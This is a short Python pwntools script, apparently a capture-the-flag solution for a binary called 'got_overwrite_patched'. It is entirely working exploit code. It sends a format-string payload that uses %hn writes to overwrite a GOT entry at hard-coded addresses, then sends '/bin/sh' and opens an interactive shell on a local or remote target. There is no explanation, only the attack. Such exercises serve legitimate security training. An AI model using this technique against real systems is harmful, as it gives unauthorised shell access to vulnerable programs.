#!/usr/bin/env python3

from pwn import *

exe = ELF("./got_overwrite_patched")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)
    
    context.log_level='debug'

    r.sendline(p32(0x0804c00c) + p32(0x0804c00e) + b'%21928x%4$hn%41516x%5$hn')
    r.recvline()
    r.sendline(b'/bin/sh')
    r.interactive()


if __name__ == "__main__":
    main()
